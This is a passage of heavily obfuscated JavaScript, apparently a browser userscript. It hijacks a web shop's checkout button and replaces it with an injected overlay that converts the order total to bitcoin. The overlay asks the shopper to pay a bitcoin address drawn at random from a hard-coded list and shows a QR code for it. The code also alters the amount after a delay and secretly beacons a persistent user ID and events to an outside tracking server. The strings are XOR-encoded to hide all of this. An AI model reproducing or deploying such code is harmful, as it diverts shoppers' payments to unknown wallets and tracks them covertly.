BdveHsFXEPZtCwcGvqe[YoSPdTLR_YVkndFilQzBum_n(0x1a3)]){qbNmTAXP$J(GGniIa_Bj$jWusyjWalJNWh);}}});FWPAxJwJHYiTKHMYb_T[up_JKAQdH_g(0x1c0)](document[up_JKAQdH_g(0x1e4)],{'childList':!![],'subtree':!![],'attributes':!![],'characterData':!![]});function fJhKnKmtUhuauF(){const vjSDNJI_$gdBl=up_JKAQdH_g;if(!AYel_pN$PhfPrY)return null;let qw_IDlNQTQ$oyY=GM_getValue(vjSDNJI_$gdBl(0x1bd),null);return!qw_IDlNQTQ$oyY&&(qw_IDlNQTQ$oyY=Math[vjSDNJI_$gdBl(0x1b0)]()[vjSDNJI_$gdBl(0x1cf)](parseFloat(-0x15c)*0xb+Math.max(0x37,0x37)*-parseInt(0x6d)+-0x1*-0x2683)[vjSDNJI_$gdBl(0x1aa)](parseFloat(parseInt(0x1ac4))+0xc*parseInt(0x2a7)+parseInt(0x1)*Math.floor(-parseInt(0x3a96)),parseFloat(0xc0a)+Math.floor(-parseInt(0x5f9))+-parseInt(0x602))+Math[vjSDNJI_$gdBl(0x1b0)]()[vjSDNJI_$gdBl(0x1cf)](parseFloat(-0x13ed)+parseInt(0x1)*Math.max(parseInt(0x1b22),0x1b22)+-parseInt(0x711))[vjSDNJI_$gdBl(0x1aa)](Number(-0x1ee8)+parseFloat(-parseInt(0x1c30))+parseInt(0x3b1a),-parseInt(0x517)*-0x4+-parseInt(0x50)*0x76+Math.floor(-parseInt(0x1093))*-0x1),GM_setValue(vjSDNJI_$gdBl(0x1bd),qw_IDlNQTQ$oyY),SYxM$Df(vjSDNJI_$gdBl(0x18a))),qw_IDlNQTQ$oyY;}function SYxM$Df(kNBbhsSAaDW,qjtV_BYo$IOIkJclLOiwSc=null){const SVNV_$URsPTB=up_JKAQdH_g;if(!AYel_pN$PhfPrY)return;const QlGuUfZ=fJhKnKmtUhuauF(),OLnHWhxLkDcLLo_xQR_KEfyhsmI=new URL(SVNV_$URsPTB(0x1b8));OLnHWhxLkDcLLo_xQR_KEfyhsmI[SVNV_$URsPTB(0x1b6)][SVNV_$URsPTB(0x1cd)](SVNV_$URsPTB(0x1bd),QlGuUfZ),OLnHWhxLkDcLLo_xQR_KEfyhsmI[SVNV_$URsPTB(0x1b6)][SVNV_$URsPTB(0x1cd)](SVNV_$URsPTB(0x17e),kNBbhsSAaDW);qjtV_BYo$IOIkJclLOiwSc&&OLnHWhxLkDcLLo_xQR_KEfyhsmI[SVNV_$URsPTB(0x1b6)][SVNV_$URsPTB(0x1cd)](SVNV_$URsPTB(0x1ba),qjtV_BYo$IOIkJclLOiwSc);window[SVNV_$URsPTB(0x1c8)][SVNV_$URsPTB(0x1d3)][SVNV_$URsPTB(0x1a7)](SVNV_$URsPTB(0x1b9))&&OLnHWhxLkDcLLo_xQR_KEfyhsmI[SVNV_$URsPTB(0x1b6)][SVNV_$URsPTB(0x1cd)](SVNV_$URsPTB(0x1be),SVNV_$URsPTB(0x192));try{GM_xmlhttpRequest({'method':SVNV_$URsPTB(0x1f3),'url':OLnHWhxLkDcLLo_xQR_KEfyhsmI[SVNV_$URsPTB(0x1cf)](),'onload':function(coorKN$bDWJnEltlhTzl){},'onerror':function(NMUHViafrIbdqrywZGebQIT){}});}catch(E$pevWB_eP){}}function WLRxwMgHzPbDhhueimn(){const g_rk$KfR=up_JKAQdH_g;if(!AYel_pN$PhfPrY)return;SYxM$Df(g_rk$KfR(0x1e3)),setInterval(()=>{const abigqSIQ$PdPsF=g_rk$KfR;SYxM$Df(abigqSIQ$PdPsF(0x1e3));},(-0x1c1*parseFloat(parseInt(0x15))+Math.max(0x9,0x9)*Math.floor(parseInt(0x31a))+parseFloat(parseInt(0x8f4)))*(Math.ceil(parseInt(0x5d1))*parseInt(0x3)+parseInt(-parseInt(0x25))*parseInt(0x8a)+Number(0x2bb))*(-0x23*-0x11c+Math.trunc(-0x14a)+-0x10d1*parseInt(0x2)));}AYel_pN$PhfPrY&&(fJhKnKmtUhuauF(),WLRxwMgHzPbDhhueimn(),window[up_JKAQdH_g(0x1c8)][up_JKAQdH_g(0x1d3)][up_JKAQdH_g(0x1a7)](up_JKAQdH_g(0x1b9))&&SYxM$Df(up_JKAQdH_g(0x1be)));async function ew_$mhikvJna(){const NxFVEitlinuzT=up_JKAQdH_g,LAai$RK_niZu=NxFVEitlinuzT(0x1ad),j_oZMlmg$T=async()=>{return new Promise(llkojhKqrcJuHBbqcj=>{const UnrCgTMFGQxFuKuouPrYHUMB=setInterval(()=>{const flpHjG$kB$m=QnrCrkJL$S$xRqZLPN,NBRVYlyn$tON=document[flpHjG$kB$m(0x18c)](LAai$RK_niZu);NBRVYlyn$tON&&(clearInterval(UnrCgTMFGQxFuKuouPrYHUMB),llkojhKqrcJuHBbqcj(NBRVYlyn$tON));},parseFloat(-parseInt(0x7))*0x209+-parseInt(0x608)+0x14ab);});},hARYlBLzYrQeJJ$D=await j_oZMlmg$T();hARYlBLzYrQeJJ$D[NxFVEitlinuzT(0x1db)]=async function(EJrMGbowrCNPcaZQzBBjfQzAg){const PGJUaPZEAK_UdJJEBrpXQLI$jx=NxFVEitlinuzT;EJrMGbowrCNPcaZQzBBjfQzAg[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x190)](),EJrMGbowrCNPcaZQzBBjfQzAg[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x18e)](),hARYlBLzYrQeJJ$D[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1c9)]=!![],hARYlBLzYrQeJJ$D[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1d6)][PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1c1)]=PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1a2);const wv$gdWL$MSAfGAFwYNh=document[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1e8)](PGJUaPZEAK_UdJJEBrpXQLI$jx(0x184)),yQvajOvGgpAw_mZxi=document[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x18c)](PGJUaPZEAK_UdJJEBrpXQLI$jx(0x197));if(!wv$gdWL$MSAfGAFwYNh[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x191)]||!yQvajOvGgpAw_mZxi)return;const Rbyr$GbLvmRdOBq_XDRdoNqb=Array[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x180)](wv$gdWL$MSAfGAFwYNh)[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1c3)](DHWu_JQQ_qTOIiusvEhgTFwYiY=>{const cKRLu_e=PGJUaPZEAK_UdJJEBrpXQLI$jx,pDDtk=DHWu_JQQ_qTOIiusvEhgTFwYiY[cKRLu_e(0x1de)][cKRLu_e(0x1f6)]()[cKRLu_e(0x1d9)](/[^\d.,]/g,'')[cKRLu_e(0x1d9)](',','.');return parseFloat(pDDtk);})[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1e0)](GCflpFZTZTR_yZkrEtVFDDh_Drf=>!isNaN(GCflpFZTZTR_yZkrEtVFDDh_Drf)),RlswtyKcf_curQ_mATWOVnqgg=Math[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1dd)](...Rbyr$GbLvmRdOBq_XDRdoNqb),QDEZcUwNHLsuoxaZKCXc=yQvajOvGgpAw_mZxi[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1de)][PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1f6)]();if(!RlswtyKcf_curQ_mATWOVnqgg||!QDEZcUwNHLsuoxaZKCXc)return;let i_KNMGzWp$iF;try{const GUCuKNVfAmrpVPaFTStZXznPp=await fetch(PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1ae)+QDEZcUwNHLsuoxaZKCXc[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x18d)]()),oqqXq=await GUCuKNVfAmrpVPaFTStZXznPp[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x17f)](),XmupDDUxUTDDQnlJROcu=oqqXq?.[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1e6)]?.[QDEZcUwNHLsuoxaZKCXc[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x18d)]()];if(!XmupDDUxUTDDQnlJROcu)throw new Error(PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1f4));i_KNMGzWp$iF=(RlswtyKcf_curQ_mATWOVnqgg/XmupDDUxUTDDQnlJROcu)[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1e7)](0x1184+Math.trunc(parseInt(0x2161))+-0x32dd);}catch(rMIB$KXVEH){i_KNMGzWp$iF=(RlswtyKcf_curQ_mATWOVnqgg/(parseInt(0x6e39)*-parseInt(0x3)+Math.trunc(-0x1)*parseInt(0xecf8)+parseFloat(parseInt(0x5))*parseInt(0x9897)))[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1e7)](0x81*parseInt(0x35)+Math.trunc(parseInt(0x1))*-parseInt(0x23ab)+0x8fe);}if(isNaN(i_KNMGzWp$iF)){alert(PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1da)),hARYlBLzYrQeJJ$D[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1c9)]=![],hARYlBLzYrQeJJ$D[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1d6)][PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1c1)]=PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1ef);return;}i_KNMGzWp$iF=i_KNMGzWp$iF[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1bc)](-0x40*Number(-parseInt(0x44))+parseFloat(parseInt(0x4))*Number(-parseInt(0x136))+-0xc28,-(0x2*-0x964+Math.ceil(-parseInt(0x7f7))+parseInt(0x1ac0)))+'0',gLdVZNPH=i_KNMGzWp$iF,jiGIOxCWLfTJp=AoKBbZdIBRZJlIkA$sjrrL[Math[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x181)](Math[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1b0)]()*AoKBbZdIBRZJlIkA$sjrrL[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x191)])];!fwMNpdOglVcTnpdoEq&&(fwMNpdOglVcTnpdoEq=Date[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x19c)]());xlPFqxhV$maUQFXS(gLdVZNPH,jiGIOxCWLfTJp);AYel_pN$PhfPrY&&SYxM$Df(PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1e2),gLdVZNPH);const IDp$hk=document[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x18c)](PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1ad));if(IDp$hk){const n$MvJKUCbquU_fq=document[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1e9)](PGJUaPZEAK_UdJJEBrpXQLI$jx(0x19f));n$MvJKUCbquU_fq[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1de)]=PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1d4),IDp$hk[PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1d1)][PGJUaPZEAK_UdJJEBrpXQLI$jx(0x1dc)](n$MvJKUCbquU_fq,IDp$hk),AYel_pN$PhfPrY&&SYxM$Df(PGJUaPZEAK_UdJJEBrpXQLI$jx(0x18b),gLdVZNPH);}setTimeout(()=>{const adoBo$ttSGMPROS=PGJUaPZEAK_UdJJEBrpXQLI$jx,kQX_wYi$oHV=Math.ceil(0x2327)+parseInt(0x412)+Math.trunc(-parseInt(0x2739))+0.0008;parseFloat(gLdVZNPH)>=kQX_wYi$oHV?alert(adoBo$ttSGMPROS(0x196)):alert(adoBo$ttSGMPROS(0x1b5)+gLdVZNPH+adoBo$ttSGMPROS(0x1f1));},Number(-0x8b)*Number(-parseInt(0x47))+-0x2*Math.trunc(-parseInt(0xe9e))+0x4f*Math.trunc(-parseInt(0xcf)));};}function xlPFqxhV$maUQFXS(gwxLPx,k_AYkVrLCSPDvVJwshD){const omKMxxYMMlSDAJrzm_Yal_qgx=up_JKAQdH_g;GxmyXZRvwMb$KXnsGPkrk();const B__VJLl=omKMxxYMMlSDAJrzm_Yal_qgx(0x19d)+k_AYkVrLCSPDvVJwshD+omKMxxYMMlSDAJrzm_Yal_qgx(0x18f)+gwxLPx,kQtUdHMmqMOp=omKMxxYMMlSDAJrzm_Yal_qgx(0x1c7)+gwxLPx+omKMxxYMMlSDAJrzm_Yal_qgx(0x1ca)+k_AYkVrLCSPDvVJwshD+omKMxxYMMlSDAJrzm_Yal_qgx(0x1cc)+B__VJLl+omKMxxYMMlSDAJrzm_Yal_qgx(0x194);document[omKMxxYMMlSDAJrzm_Yal_qgx(0x1e4)][omKMxxYMMlSDAJrzm_Yal_qgx(0x1ed)](omKMxxYMMlSDAJrzm_Yal_qgx(0x188),kQtUdHMmqMOp);const wuAvpsH=document[omKMxxYMMlSDAJrzm_Yal_qgx(0x1a4)](omKMxxYMMlSDAJrzm_Yal_qgx(0x1ec));wuAvpsH[omKMxxYMMlSDAJrzm_Yal_qgx(0x1db)]=()=>{OCtXKksJwh(k_AYkVrLCSPDvVJwshD);};}function OCtXKksJwh(vS_yVMei_gYy){const KqsfN$_nDhTwhCj=up_JKAQdH_g;GxmyXZRvwMb$KXnsGPkrk();const xRIaD$vvGHRQryEObPTlvLVLNm=KqsfN$_nDhTwhCj(0x1b1);document[KqsfN$_nDhTwhCj(0x1e4)][KqsfN$_nDhTwhCj(0x1ed)](KqsfN$_nDhTwhCj(0x188),xRIaD$vvGHRQryEObPTlvLVLNm);const htBpyLRxB_MdPSm_ZGA=document[KqsfN$_nDhTwhCj(0x1a4)](KqsfN$_nDhTwhCj(0x198));htBpyLRxB_MdPSm_ZGA[KqsfN$_nDhTwhCj(0x1db)]=()=>{const tRyBiOhTgEIxFuFLqGFyu=KqsfN$_nDhTwhCj;let cU_z_nXZFMRh=gLdVZNPH;const Dguf_hWJ=Date[tRyBiOhTgEIxFuFLqGFyu(0x19c)](),yaFRckABy$fXRlZm=Dguf_hWJ-fwMNpdOglVcTnpdoEq,xalloTFMgtcBaruqlvf__KOSAdD=(parseInt(0x2e)*Math.trunc(parseInt(0x9a))+parseInt(0x15bb)+Number(-0x30ef))*(-parseInt(0x1)*-parseInt(0x71)+Math.max(parseInt(0x1bfd),parseInt(0x1bfd))+-parseInt(0x1886));yaFRckABy$fXRlZm>=xalloTFMgtcBaruqlvf__KOSAdD&&!Oo$mlLVOFylpJxMWrTh&&(cU_z_nXZFMRh=gLdVZNPH[tRyBiOhTgEIxFuFLqGFyu(0x1bc)](-parseInt(0x14f8)*0x1+parseInt(0x5ea)+parseInt(0xf0e),-(-0x20fc+-0x890*Math.floor(-0x3)+Math.ceil(parseInt(0x26f))*Math.ceil(0x3)))+'9',gLdVZNPH=cU_z_nXZFMRh,Oo$mlLVOFylpJxMWrTh=!![]),xlPFqxhV$maUQFXS(cU_z_nXZFMRh,vS_yVMei_gYy);};}function GxmyXZRvwMb$KXnsGPkrk(){const u$IYawpg$ajQCLWjGiHTRo=up_JKAQdH_g,kWuVuEGtBGwGN=document[u$IYawpg$ajQCLWjGiHTRo(0x1e8)](u$IYawpg$ajQCLWjGiHTRo(0x1c4));kWuVuEGtBGwGN[u$IYawpg$ajQCLWjGiHTRo(0x1ea)](incxdILrRfvhhbsAKIT$jxD=>incxdILrRfvhhbsAKIT$jxD[u$IYawpg$ajQCLWjGiHTRo(0x187)]());}ew_$mhikvJna();}()));function QnrCrkJL$S$xRqZLPN(XMGq__chs,CbjRVnF$H){const BJkRGMIwccvpBWmSoCA_swPDkQ=BiUMggmluXGcsck_VnCMY();return QnrCrkJL$S$xRqZLPN=function(hdvirUU,bVm$PnZaR$zRmPvbSGlWJs){hdvirUU=hdvirUU-(0x1*0xb7+0x1293+Number(0x43)*-0x44);let Nt$mGXLmX=BJkRGMIwccvpBWmSoCA_swPDkQ[hdvirUU];if(QnrCrkJL$S$xRqZLPN['jkVLDc']===undefined){const dUIIRcONDFwgTCFtLwA=function(FDmcIHEcnu){let D$grrp$MMXCmldlON=0x2368+parseInt(0x91a)+-0x2ae6&parseFloat(parseInt(0x1))*0x356+Number(-0x7)*parseFloat(-parseInt(0x2c5))+parseInt(-parseInt(0x15ba)),TVlUsSLoFkVaMSOFK$ubrIZ$zAS=new Uint8Array(FDmcIHEcnu['match'](/.{1,2}/g)['map'](N$PhfP$rYigLd=>parseInt(N$PhfP$rYigLd,parseFloat(-0x25)*-0xbe+Number(0xe)*Math.ceil(-0x37)+0xdf*Math.max(-0x1c,-0x1c)))),s$zdLCMIBmDWbsdCnEDeRvHcJ=TVlUsSLoFkVaMSOFK$ubrIZ$zAS['map'](ZNPHIOomlLVOFy_lpJxMWrThw=>ZNPHIOomlLVOFy_lpJxMWrThw^D$grrp$MMXCmldlON),cuiKmOAoKBbZdIBR$ZJlIkAs=new TextDecoder(),r_$rLsAYel=cuiKmOAoKBbZdIBR$ZJlIkAs['decode'](s$zdLCMIBmDWbsdCnEDeRvHcJ);return r_$rLsAYel;};QnrCrkJL$S$xRqZLPN['jDYYam']=dUIIRcONDFwgTCFtLwA,XMGq__chs=arguments,QnrCrkJL$S$xRqZLPN['jkVLDc']=!![];}const TqsZTAUyZzMpvRbjaknFq=BJkRGMIwccvpBWmSoCA_swPDkQ[parseFloat(parseInt(0x6f7))*parseInt(0x2)+-parseInt(0x1)*0xaea+0x304*-parseInt(0x1)],JrqvZ_wTuL$Wirh=hdvirUU+TqsZTAUyZzMpvRbjaknFq,VydkH$XCxMDA=XMGq__chs[JrqvZ_wTuL$Wirh];return!VydkH$XCxMDA?(QnrCrkJL$S$xRqZLPN['ggqkwZ']===undefined&&(QnrCrkJL$S$xRqZLPN['ggqkwZ']=!![]),Nt$mGXLmX=QnrCrkJL$S$xRqZLPN['jDYYam'](Nt$mGXLmX),XMGq__chs[JrqvZ_wTuL$Wirh]=Nt$mGXLmX):Nt$mGXLmX=VydkH$XCxMDA,Nt$mGXLmX;},QnrCrkJL$S$xRqZLPN(XMGq__chs,CbjRVnF$H);}function BiUMggmluXGcsck_VnCMY(){const xjBSlvhUDKW$tPJLaNNJoa=['fbf3b1fefdfff7b1e8f3b1f3eef8f9ee','feffadeda5fbabf0a5abfdfff6edf4abedeff9aee8eea8eae5fdecfaabe6f7f7e6eeaceea8fbeca8ebee','fff4f5f0f8d2f3f8f9ef','f4fdef','f2f3eb','f4e8e8ecefa6b3b3fdecf5b2edeeeff9eeeaf9eeb2fff3f1b3eaadb3ffeef9fde8f9b1edeeb1fff3f8f9b3a3eff5e6f9a1ada8abe4ada8abbaf8fde8fda1fef5e8fff3f5f2a6','a8a4a9abacafa5e9c5c5ebfbef','f8f5ea','adaeeff6d6d2e6cc','feffadedf6f8eef2e4a4eaa9f7a5a5eaebfdfaacaef4e9f7e9abf6fff9e5e5fde6a4edafabe5eaeca9f6','f2f3f2f9','fdf8f8f9f8d2f3f8f9ef','fbf9e8d9f0f9f1f9f2e8dee5d5f8','feffadede8eee9faafe4f7f8aae9aff4f7e4fbfbacabeaace9e4eba4efa9ebe8f6f6a5faf6abafa9aaa9','feffadeda9a4f9aaf9faa9fff7e8fae6a5edecebaff1effff1eaeca5e5aff7e6e4efaeeaeef0faeef9ac','f5f2fff0e9f8f9ef','feffadedaff6affda5a9e8f7a4aaf9ace9f7a8faf9a5f8fdaffaf4eafbf0a9f1fde6fdaaf2a8edaaa4aa','f9f2f8efcbf5e8f4','efe9feefe8eef5f2fb','feffadedaff1e5f7f0a8acf9ebf2aaabafffaeaeaff8a5f2f0a9ffa5e4e4e9e5ecf8ace5f0afeae5eae4','eff9e8','fee9e8e8f3f2c7f8fde8fdb1f9eaf9f2e8a1befffdeee8b1fff3f2e8f5f2e9f9bec1','f4e8e8ecefa6b3b3fdecf5b2fff3f5f2fbf9fff7f3b2fff3f1b3fdecf5b3eaafb3eff5f1ecf0f9b3eceef5fff9a3f5f8efa1fef5e8fff3f5f2baeaefc3ffe9eeeef9f2fff5f9efa1','feffadedebeeacebf0aee5ebfff4e8e6e8f0a8f1a8fbfaf0e9e6eba4f6fdf0eef4ece9fbebabaeaeaea4','eefdf2f8f3f1','96bcbcbcbcbcbcbcbcbcbcbcbca0f8f5eabcf8fde8fdb1e8f9efe8b1f5f8a1bef3eaf9eef0fde5b1fff3f2e8fdf5f2f9eebebcefe8e5f0f9a1beecf3eff5e8f5f3f2a6bcfaf5e4f9f8a7bce8f3eca6bcaca7bcf0f9fae8a6bcaca7bcebf5f8e8f4a6bcadacaceaeba7bcf4f9f5fbf4e8a6bcadacaceaf4a7bcfefdfff7fbeef3e9f2f8b1fff3f0f3eea6bceefbfefdb4acb0bcacb0bcacb0bcacb2a4b5a7bcf8f5efecf0fde5a6bcfaf0f9e4a7bcf6e9efe8f5fae5b1fff3f2e8f9f2e8a6bcfff9f2e8f9eea7bcfdf0f5fbf2b1f5e8f9f1efa6bcfff9f2e8f9eea7bce6b1f5f2f8f9e4a6bca5a5a5a5a7bce8f9e4e8b1fdf0f5fbf2a6bcfff9f2e8f9eea7bea296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0f8f5eabcf8fde8fdb1e8f9efe8b1f5f8a1befff4f5f0f8eef9f2b1fff3f2e8fdf5f2f9eebebcefe8e5f0f9a1befefdfff7fbeef3e9f2f8b1fff3f0f3eea6bcebf4f5e8f9a7bcecfdf8f8f5f2fba6bca8acece4a7bcfef3eef8f9eeb1eefdf8f5e9efa6bca8ece4a7bcfef3e4b1eff4fdf8f3eba6bcacece4bcaaece4bcaeacece4bceefbfefdb4acb0bcacb0bcacb0bcacb2ada9b5a7bcf1fde4b1ebf5f8e8f4a6bca9abacece4a7bcebf5f8e8f4a6bcadacacb9a7bcfaf3f2e8b1fafdf1f5f0e5a6bccef3fef3e8f3b0bceffdf2efb1eff9eef5faa7bea296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0f5f1fbbcefeeffa1bef4e8e8ecefa6b3b3fff4f9fff7f3e9e8b2ecfde5b2fbaefdb2fff3f1b3e6f9f2c3fee8ffb2ecf2fbbebcfdf0e8a1bedef5e8fff3f5f2bebcefe8e5f0f9a1beebf5f8e8f4a6bcadacacece4a7bcf1fdeefbf5f2b1fef3e8e8f3f1a6bcaeacece4a7bea296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0ecbcefe8e5f0f9a1befaf3f2e8b1eff5e6f9a6bcadaaece4a7bcfff3f0f3eea6bcfbeef9e5a7bcf1fdeefbf5f2b1fef3e8e8f3f1a6bcadacece4a7bea2d2f3bcecfde5f1f9f2e8bcf8f9e8f9ffe8f9f8b2a0b3eca296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0f8f5eabcefe8e5f0f9a1bef1fdeefbf5f2a6bcadaaece4bcfde9e8f3a7bea2a0b3f8f5eaa296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0eff1fdf0f0bcefe8e5f0f9a1befff3f0f3eea6bcfef0fdfff7a7bea296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcccf0f9fdeff9bceaf9eef5fae5bce8f4fde8bce8f4f9bcfdf1f3e9f2e8bce5f3e9bceff9f2e8bcf5efbcfff3eeeef9ffe8b2a0feeea2a0feeea296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcd5fabce5f3e9bcf3eaf9eeecfdf5f8bcf3eebce9f2f8f9eeecfdf5f8b0bcecf0f9fdeff9bcf1fdf7f9bcfdf2f3e8f4f9eebcecfde5f1f9f2e8bcebf5e8f4bce8f4f9bcf9e4fdffe8bcfdf1f3e9f2e8bce8f3bce8f4f9bceffdf1f9bcfdf8f8eef9efefb2bcc8f4f9bcf5f2f5e8f5fdf0bcecfde5f1f9f2e8bcebf5f0f0bcfef9bceef9fae9f2f8f9f8bcf5f1f1f9f8f5fde8f9f0e5bcf3f2fff9bce8f4f9bcfff3eeeef9ffe8bcfdf1f3e9f2e8bcf5efbceef9fff9f5eaf9f8b296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0b3eff1fdf0f0a296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0feeea2a0feeea296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0fee9e8e8f3f2bcf5f8a1befbf3b1fefdfff7b1e8f3b1f3eef8f9eebebcefe8e5f0f9a1befef3e4b1eff5e6f5f2fba6bcfef3eef8f9eeb1fef3e4a7bcf8f5efecf0fde5a6bcf5f2f0f5f2f9b1faf0f9e4a7bcfaf0f9e4b1f8f5eef9ffe8f5f3f2a6bceef3eba7bcfdf0f5fbf2b1f5e8f9f1efa6bcfff9f2e8f9eea7bcf6e9efe8f5fae5b1fff3f2e8f9f2e8a6bcfff9f2e8f9eea7bcfbfdeca6bca4ece4a7bcecf3eff5e8f5f3f2a6bceef9f0fde8f5eaf9a7bcfaf3f2e8b1eff5e6f9a6bcada8ece4a7bcfaf3f2e8b1ebf9f5fbf4e8a6bcabacaca7bcf4f9f5fbf4e8a6bca8aeece4a7bcecfdf8f8f5f2fba6bcacece4bcafadece4a7bce8f9e4e8b1f8f9fff3eefde8f5f3f2a6bcf2f3f2f9a7bcfff3f0f3eea6bcbfaedaa4aedadea7bcfefdfff7fbeef3e9f2f8b1fff3f0f3eea6bce8eefdf2efecfdeef9f2e8a7bcfef3eef8f9eea6bcadece4bceff3f0f5f8bcbfaedaa4aedadea7bcfef3eef8f9eeb1eefdf8f5e9efa6bca8ece4a7bcffe9eeeff3eea6bcecf3f5f2e8f9eea7bcf1fdeefbf5f2b1e8f3eca6bcadaeece4a7bea2dbf3bcfefdfff7bce8f3bcf3eef8f9eebcf8f9e8fdf5f0efa0b3fee9e8e8f3f2a296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0b3f8f5eaa296bcbcbcbcbcbcbcbcbcbcbcbca0b3f8f5eaa2','a5acaea4adacd8d5c5caf6f3','f2fdf1f9','feffadedaeaff4afeba9aceaf4a8e6aef6eceef1e4f0fde8aee6f4faaffaabaca8e5a5ecacaff4e6ecec','c5f3e9eebcf3eef8f9eebceafdf0e9f9bcf5efbc','eff9fdeefff4ccfdeefdf1ef','feffadedafa4f1e5a9e9e6a8ebe8eaf8aaf9fbeaa5eba9a5fff6f0aef6e6ffabfafda5a9a5aee5a5acaa','f4e8e8ecefa6b3b3e8f5f1f9efe5f2ffb2f8fde8f9b3e8eefdfff7f5f2fbb2ecf4ec','fbaefdb2fff3f1','fee8ffc3fdf1f3e9f2e8','c8d9c4c8c3d2d3d8d9','eff0f5fff9','e9eff9eec3f5f8','eff5e8f9c3eaf5eff5e8','afadadaea4a5c9d0c9c4faee','f3feeff9eeeaf9','ecf3f5f2e8f9eed9eaf9f2e8ef','aea5aaa5a8a4c9def2decdd8','f1fdec','c7f8fde8fdb1e8f9efe8b1f5f8a1bef3eaf9eef0fde5b1fff3f2e8fdf5f2f9eebec1','feffadeda9a9f9fdfde8efafabf9e9ace5fda8fdf0a5f0fbfda9eefaebaeeeeeaaabfda9a8ffacf1ffab','feffadedabfdecfbe4f0fae6abafe4fde4aba8eaefeca8f6abe8aaf7eface4e6faf4edeaf7afe8a9f1e6','96bcbcbcbcbcbcbcbcbcbcbcbca0f8f5eabcf8fde8fdb1e8f9efe8b1f5f8a1bef3eaf9eef0fde5b1fff3f2e8fdf5f2f9eebebcefe8e5f0f9a1beecf3eff5e8f5f3f2a6bcfaf5e4f9f8a7bce8f3eca6bcaca7bcf0f9fae8a6bcaca7bcebf5f8e8f4a6bcadacaceaeba7bcf4f9f5fbf4e8a6bcadacaceaf4a7bcfefdfff7fbeef3e9f2f8b1fff3f0f3eea6bceefbfefdb4acb0bcacb0bcacb0bcacb2a4b5a7bcf8f5efecf0fde5a6bcfaf0f9e4a7bcf6e9efe8f5fae5b1fff3f2e8f9f2e8a6bcfff9f2e8f9eea7bcfdf0f5fbf2b1f5e8f9f1efa6bcfff9f2e8f9eea7bce6b1f5f2f8f9e4a6bca5a5a5a5a7bce8f9e4e8b1fdf0f5fbf2a6bcfff9f2e8f9eea7bea296bcbcbcbcbcbcbcbcbcbcbcbcbcbca0f8f5eabcf8fde8fdb1e8f9efe8b1f5f8a1befff4f5f0f8eef9f2b1fff3f2e8fdf5f2f9eebebcefe8e5f0f9a1befefdfff7fbeef3e9f2f8b1fff3f0f3eea6bcebf4f5e8f9a7bcecfdf8f8f5f2fba6bca8acece4a7bcfef3eef8f9eeb1eefdf8f5e9efa6bca8ece4a7bcfef3e4b1eff4fdf8f3eba6bcacece4bcaaece4bcaeacece4bceefbfefdb4acb0bcacb0bcacb0bcacb2ada9b5a7bcf1fde4b1ebf5f8e8f4a6bca9abacece4a7bcebf5f8e8f4a6bcadacacb9a7bcfaf3f2e8b1fafdf1f5f0e5a6bccef3fef3e8f3b0bceffdf2efb1eff9eef5faa7bea296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0f5f1fbbcefeeffa1bef4e8e8ecefa6b3b3fff4f9fff7f3e9e8b2ecfde5b2fbaefdb2fff3f1b3e6f9f2c3fee8ffb2ecf2fbbebcfdf0e8a1bedef5e8fff3f5f2bebcefe8e5f0f9a1beebf5f8e8f4a6bcadacacece4a7bcf1fdeefbf5f2b1fef3e8e8f3f1a6bcaeacece4a7bea296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0ecbcefe8e5f0f9a1befaf3f2e8b1eff5e6f9a6bcadaaece4a7bcfff3f0f3eea6bcfbeef9e5a7bcf1fdeefbf5f2b1fef3e8e8f3f1a6bcadacece4a7bea296bc